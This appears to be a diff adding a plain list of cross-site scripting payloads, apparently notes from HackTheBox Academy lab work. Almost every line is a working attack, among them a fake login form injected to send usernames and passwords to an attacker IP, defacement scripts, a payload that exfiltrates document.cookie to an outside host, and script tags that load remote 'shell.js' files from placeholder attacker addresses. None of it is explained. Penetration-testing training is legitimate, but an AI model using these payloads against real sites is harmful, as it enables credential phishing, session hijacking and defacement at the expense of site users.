@@ -1,0 +1,34 @@
+/index.php?url=document.write(%27<h3>Please%20login%20to%20continue</h3><form%20action=http://10.10.15.108><input%20type="username"%20name="username"%20placeholder="Username"><input%20type="password"%20name="password"%20placeholder="Password"><input%20type="submit"%20name="submit"%20value="Login"></form>);document.getElementById(%27urlform%27).remove();
+
+
+<img src="" onerror=alert(window.origin)>
+
+<script>document.body.style.background = "#141d2b"</script>
+
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+
+<script>document.title = 'HackTheBox Academy'</script>
+
+<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
+
+<script>document.getElementById('urlform').remove();</script>
+
+<script src="http://OUR_IP/script.js"></script>
+
+<script>new Image().src='http://0.0.0.0/index.php?c='+document.cookie</script>
+
+http://0.0.0.0/index.php?
+
+<script src="http://0.0.0.0/index.php"></script>
+
+<script src="http://0.0.0.0:80/index.php"></script>
+
+<script src="http://10.10.15.108:80/script.js"></script>
+
+http://www.trilocor.local:9000/login?error=`%3Cscript%3Enew%20Image().src=%27http://10.10.14.24:4444/shell.js%22%3E%3C/script%3E`
+
+'<script>new Image().src='http://0.0.0.0/shell.js"></script>'
+
+'<script>new Image().src='http://our_ip/shell.js"></script>'
+
+'<script src="http://OUR_IP/shell.js"></script>'
